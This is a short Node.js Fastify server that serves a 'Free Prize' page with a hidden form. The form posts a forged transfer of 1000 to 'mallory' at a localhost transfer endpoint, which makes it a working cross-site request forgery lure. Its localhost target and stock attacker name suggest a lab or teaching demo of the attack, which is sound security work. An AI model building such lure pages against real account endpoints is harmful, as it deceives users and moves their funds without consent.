import Fastify from "fastify";

const fastify = Fastify({
  logger: {
    transport: { target: "pino-pretty" },
  },
});

fastify.get("/", function (request, reply) {
  reply.header("Content-Type", "text/html; charset=utf-8").send(`<html>
<head>
  <title>App</title>
</head>
<body>
  <h1>Free Prize</h1>
  <p>Claim your reward below.</p>
  <form method="POST" action="http://localhost:3000/transfer">
    <input type="hidden" name="to" value="mallory" />
    <input type="hidden" name="amount" value="1000" />
    <button type="submit">Claim reward</button>
  </form>
</body>
</html>`);
});

fastify.listen({ port: 4000 }, function (err, address) {
  if (err) {
    fastify.log.error(err);
    process.exit(1);
  }
});
